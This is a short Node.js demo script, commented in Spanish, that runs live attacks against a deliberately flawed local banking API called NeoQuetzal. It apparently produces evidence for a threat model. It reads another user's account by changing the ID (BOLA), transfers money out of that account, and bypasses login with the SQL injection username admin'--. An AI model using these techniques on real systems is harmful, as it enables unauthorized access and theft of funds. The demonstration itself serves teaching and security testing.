// ============================================================
//  DEMO - Ataques en vivo contra NeoQuetzal API
//  Correr en una SEGUNDA ventana, con la app ya encendida:
//      node demo.js
//  (No necesita --experimental-sqlite; solo hace llamadas HTTP.)
// ============================================================
const BASE = "http://localhost:3000";

async function call(method, path, body, token) {
  const headers = { "Content-Type": "application/json" };
  if (token) headers["Authorization"] = "Bearer " + token;
  const res = await fetch(BASE + path, {
    method, headers, body: body ? JSON.stringify(body) : undefined
  });
  return res.json();
}

const line = (s = "") => console.log(s);

async function main() {
  line("================================================================");
  line("   DEMOSTRACION EN VIVO - NeoQuetzal API (version con fallos)");
  line("================================================================");
  line();

  line("PASO 1 - Juan Perez inicia sesion normalmente (dueno de la cuenta 101)");
  const login = await call("POST", "/api/login", { usuario: "jperez", password: "Pollo123" });
  const token = login.token;
  line("   -> La app le da su 'pase de entrada'. Nombre: " + login.nombre);
  line();

  line("PASO 2 - Juan mira SU cuenta (101). Esto es correcto y permitido:");
  const propia = await call("GET", "/api/accounts/101", null, token);
  line("   -> Saldo de Juan: Q" + propia.saldo.toLocaleString());
  line();

  line("PASO 3 - EL ATAQUE: Juan pide la cuenta 104, que es de OTRA persona (Maria)");
  line("   (solo cambia el numero 101 por 104, nada mas)");
  const ajena = await call("GET", "/api/accounts/104", null, token);
  line("   -> La app le entrega la cuenta de Maria. Saldo: Q" + ajena.saldo.toLocaleString());
  line("   >> FALLO 'BOLA': ve el dinero de alguien mas. (amenaza T-06)");
  line();

  line("PASO 4 - Peor: Juan transfiere Q500,000 DESDE la cuenta de Maria a la suya");
  const tr = await call("POST", "/api/transfers", { origen: 104, destino: 101, monto: 500000 }, token);
  line("   -> Respuesta de la app: " + tr.mensaje);
  line("   >> FALLO: movio dinero de una cuenta que no es suya. (amenaza T-07)");
  line();

  line("PASO 5 - Entrar como ADMINISTRADOR sin saber la contrasena (inyeccion SQL)");
  line("   (escribe como usuario el texto:  admin'--  )");
  const hack = await call("POST", "/api/login", { usuario: "admin'--", password: "no_la_se" });
  line("   -> Inicio de sesion como: " + hack.nombre);
  line("   >> FALLO 'Inyeccion SQL': entro sin contrasena valida. (amenaza T-09)");
  line();

  line("================================================================");
  line(" Fin de la demo. Todo esto es lo que se documenta como evidencia.");
  line("================================================================");
}

main().catch(e => {
  console.error("No se pudo conectar. Asegurate de que la app este encendida");
  console.error("en la otra ventana (localhost:3000). Detalle:", e.message);
});
